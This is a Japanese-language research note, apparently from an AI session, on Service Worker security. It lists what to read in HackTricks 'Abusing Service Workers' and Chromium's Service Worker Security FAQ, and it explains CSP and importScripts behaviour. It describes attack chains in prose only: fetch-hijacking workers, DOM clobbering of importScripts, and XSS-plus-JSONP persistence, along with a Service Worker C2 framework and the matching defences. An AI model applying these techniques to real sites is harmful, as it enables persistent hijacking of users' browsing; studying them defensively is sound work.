- 〔補足（一般知識）〕**SWとCSP**: ページのCSPはSWスクリプト内の `importScripts` を直接制限しない。SW自身に適用するCSPは、**SWスクリプト応答の `Content-Security-Policy` レスポンスヘッダ**で指定する（Chromium FAQの推奨）。逆に言えば、これを設定しないと `importScripts` の引数汚染でCSPを回避される。

---

## 読者が自分で開くべき資料

egressポリシーにより `book.hacktricks.xyz` と `chromium.googlesource.com` は本セッションから直接開けなかった（両ホストとも組織のegressプロキシが403で拒否。ただし内容自体は各プロジェクトの公式GitHub原本Markdownから全文取得済み）。読者が自分の環境で一次資料を開く場合の読みどころ:

- **HackTricks「Abusing Service Workers」**
  （rendered: `https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers`、
   現行ドメインは `book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/abusing-service-workers.html` の可能性、
   原本: `https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md`）
  読みどころ:
  1. 「Attack Creating a Service Worker」節の**PoC 3点**（`fetch`乗っ取りSW本体、`navigator.serviceWorker.register` の登録スクリプト、JSONP悪用時の `var sw` 値）を実際のコードで確認する。
  2. 「Abusing `importScripts` in a SW via DOM Clobbering」の `index.html`/`sw.js` 脆弱コード例と、CSP回避が成立する理由。
  3. 参考文献[1] PortSwigger「Hijacking service workers via DOM Clobbering」への導線（DOM Clobbering×SWの実例）。
  4. Shadow Workers（`shadow-workers.github.io`）というSW悪用C2フレームワークの存在。
  5. リンク先の `dom-clobbering.md`（同リポジトリ）でDOM Clobberingの前提を補完。

- **Chromium「Service Worker Security FAQ」**
  （`https://chromium.googlesource.com/chromium/src/+/main/docs/security/service-worker-security-faq.md`、
   ミラー原本: `https://github.com/chromium/chromium/blob/main/docs/security/service-worker-security-faq.md`）
  読みどころ:
  1. 「Do Service Workers obey the same-origin policy?」— scope比較が**パス最長前方一致**である仕様の緩さ（w3c/ServiceWorker#1118）と、Secure Context必須、`importScripts` とCSPヘッダの関係。
  2. 「Do Service Workers live forever?」— **24時間更新チェック / 86,400秒 / 30秒アイドル終了 / 5分イベント上限 / 30秒ping** の各数値と Payment Handler 例外。
  3. 「If a site has an XSS vulnerability, can the attacker permanently compromise that origin?」— XSS+JSONPでCSP回避・SW登録・`importScripts` 永続化の連鎖と、**最大24時間**の残存保証、`Clear-Site-Data`・`Service-Worker` ヘッダ拒否の防御。
  4. 「Can iframes register Service Workers?」— サードパーティiframeのSWが**トップレベルサイトでパーティション化**される点。
  5. 「What SW bugs would qualify for a bounty under Chrome's VRP?」— 報奨対象になるセキュリティ表明（over-long lifetime、same-origin bypass、無許可の権限アクセス: Geolocation/センサ/マイク・カメラ/USB・Bluetooth）。
  6. 併読推奨の一般セキュリティFAQ `faq.md`（同ディレクトリ）。
